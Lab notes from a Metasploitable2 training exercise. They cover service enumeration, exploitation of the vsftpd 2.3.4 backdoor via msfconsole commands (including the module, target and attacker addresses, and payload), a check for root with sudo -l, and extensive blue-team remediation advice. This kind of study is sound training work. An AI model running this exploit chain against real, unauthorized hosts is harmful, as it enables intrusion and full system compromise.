# Metasploitable2 Exploration Notes

**Target IP:** `192.168.0.128`  
**Environment:** Metasploitable2 (vulnerable test VM) — **Do not expose to untrusted networks**  
**Author:** [your name / handle]  
**Date:** 2025-09-13

---

## 1. Objective
Explore the Metasploitable2 target to enumerate services, identify vulnerabilities, and demonstrate exploitation paths. Capture findings useful for both red-team (offense) learning and blue-team (defense/hardening) remediation.

---

## 2. Initial observations
- Visiting the target IP in a browser shows the default Metasploitable2 landing page and a warning:
  > **Warning:** Never expose this VM to an untrusted network!  
  > Contact: msfdev[at]metasploit.com  
  > Login with `msfadmin/msfadmin` to get started

- The page lists several deliberately vulnerable web applications and services, including: `TWiki`, `phpMyAdmin`, `Mutillidae`, `DVWA`, `WebDAV` and more. Many of these contain known vulnerabilities to practice with.

- **Note:** phpMyAdmin on this image requires a password; `msfadmin`/`msfadmin` did not authenticate there in this session (may be configured differently). DVWA is present and accessible — useful for web-app exploitation practice.

- Metasploitable2 services often run as privileged users (e.g., "runs as admin") which increases impact of exploits and is intentional for lab purposes.

---

## 3. Services discovered & initial enumeration
- FTP: `vsftpd 2.3.4` (port 21) — known to have a backdoor exploit in older builds.  
- HTTP: Default Metasploitable2 web portal and multiple web-app endpoints (TWiki, DVWA, Mutillidae, WebDAV, phpMyAdmin).  
- SSH: (if present) typical default configuration for the lab.  
- Note: This exercise focused on `vsftpd 2.3.4` exploitation as a direct and fast path to a shell.

---

## 4. Exploitation notes (red-team steps)
> **Precondition:** Only perform on authorized lab instances.

1. **Set target & attacker interfaces in Metasploit:**
   - `RHOST` = `192.168.0.128` (target)
   - `LHOST` = `192.168.0.231` (attacker / Kali)

2. **Use the vsftpd 2.3.4 backdoor exploit in Metasploit:**
   - Module: `exploit/unix/ftp/vsftpd_234_backdoor` (or similar)
   - Set payload and options, then `exploit`

3. **Result:** An interactive shell opened quickly. The lab's flag was found in the `msfadmin` user's directory.

4. **Privilege check:** Run `sudo -l` to list allowed sudo actions. In this case, the environment allowed escalation to root (lab intentionally configured to illustrate privilege escalation).

**Commands (example):**
```bash
# In msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.0.128
set LHOST 192.168.0.231
set PAYLOAD cmd/unix/interact
exploit
# After shell
ls /home/msfadmin
cat /home/msfadmin/user.txt   # or flag file found in msfadmin dir
sudo -l
```

---

## 5. Findings (concise)
- **No lockout/timeout:** Metasploit2 server (Metasploitable2 environment) does not implement account lockout or session timeout for administrative access — this is intentional in the lab but demonstrates a defensive gap in real environments.
- **Privileged services:** Many services run with elevated privileges (e.g., as root/admin) increasing exploit impact. In real-world systems, services should run with least privilege.
- **Multiple web-app vulnerabilities:** Presence of DVWA, Mutillidae, TWiki, phpMyAdmin, WebDAV expose numerous potential attack vectors (SQLi, RCE, file upload, auth bypass, etc.).
- **vsftpd 2.3.4 backdoor** provided immediate remote code execution (RCE) / shell in this lab instance — classic and fast exploitation path in Metasploitable2.

---

## 6. Impact
- Full system compromise achievable via known vsftpd backdoor exploit when service runs with excessive privileges.  
- Unauthorized access to web applications and stored credentials/artifacts possible.  
- In production, similar misconfigurations would allow data exfiltration, lateral movement, persistence, and complete system takeover.

---

## 7. Remediation & Blue Team recommendations
While Metasploitable2 is a purposely insecure training VM, the following real-world hardening steps would mitigate the discovered weaknesses:

### Immediate fixes
- **Patch/upgrade services**: Remove legacy/unsupported versions (e.g., upgrade vsftpd to a patched release).  
- **Remove or restrict vulnerable services**: Disable FTP if not required; use secure alternatives (SFTP/FTPS) with strong configuration.  
- **Least privilege**: Configure services to run under dedicated low-privilege accounts, not as root/Administrator.  
- **Credential hygiene**: Change default passwords (`msfadmin`), enforce strong password policies, and disable or rotate default accounts.

### Medium-term & process improvements
- **Network segmentation & ACLs**: Limit access to admin interfaces and developer tooling behind management networks and firewalls.  
- **Implement account lockout & session control**: Enforce lockout thresholds, MFA for admin panels, session timeouts and monitoring.  
- **Harden web apps**: Remove development/demo apps from production environments; scan and patch web applications regularly.  
- **Monitoring & detection**: Deploy host and network IDS/IPS (Wazuh/OSSEC, Suricata), and monitor for anomalous FTP/SSH logins and web exploit patterns.  
- **Regular pentesting & vulnerability management**: Schedule frequent scans and remediation cycles to find and fix issues before attackers do.

---

## 8. Lessons learned / notes for future labs
- Metasploitable2 is an excellent training VM showcasing a range of vulnerabilities — use it to practice both exploit techniques and defensive mitigations.  
- Always confirm service versions and binary locations before assuming exploit applicability.  
- Keep an organized evidence trail: capture logs, output from Metasploit, and indicate file paths for flags and indicators of compromise (IOCs).

---

## 9. Evidence / artifacts
- `msfconsole` session log with exploit run and shell output.  
- Path to discovered flag (e.g., `/home/msfadmin/*`).  
- Notes on `sudo -l` output and any root access indicators.

---

*End of Metasploitable2 exploration notes.*

---
Original Notes:

ip “192.168.0.128”

to we're going to expllore the metasploit server

first thing I notice is that Metasploit2 do not have a lockout/timeout for it's server when running. the server never locks the user out

another issue, metasploitable2 runs as admin

if we enter hte ip into the browser we get a website

website info:

                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


    TWiki
    phpMyAdmin
    Mutillidae
    DVWA
    WebDAV

phpadmin requires a password, msfadmin doesn't work

we also have dwva (found on the metasploitable2 website)

this means we have a lot of sub sites we can find
furthermore, we can log into dwva (damn vuln web app) that we can learn and exploit! How usefule:D

so we have MANY many ways to exploit this.

We decided to utilize port 21 and vsftpd 2.3.4 which as exploits when we look at metaploitable

so, we have lots of options here, but let's do the direct thing and go for the server

so when we use metaplosit with vsftpd 2.3.4 we set the rhost as teh target of 192.168.0.128 and local host (lhost) of 192.168.0.231 and utilize the 2.3.4 exploit and we get a shell instantly - found the flag under the msfadmin dir

we use sudo -l and see that we have root access

Now hte hard part, fixing the issue via blue team.
